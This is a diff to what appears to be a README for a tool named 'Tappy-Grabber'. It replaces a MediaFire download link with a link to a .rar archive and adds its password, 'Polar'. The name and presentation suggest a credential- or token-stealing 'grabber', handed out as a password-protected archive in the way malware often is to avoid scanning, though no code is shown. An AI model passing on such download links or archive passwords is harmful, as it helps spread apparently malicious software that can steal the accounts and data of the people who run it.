@@ -12,8 +12,8 @@
 ![download](https://user-images.githubusercontent.com/113463089/189969167-48c22b23-5506-42d0-bef5-a8d61be625d3.png)
 
 <br>
-💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/hwzxxam76olqurn/Tappy-Grabber.zip/file
-
+💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/31xt40uyo9g41xo/Tappy-Grabber.rar/file
+💸 <b>• SENHA :</b> Polar
 
 <br>
 <br>
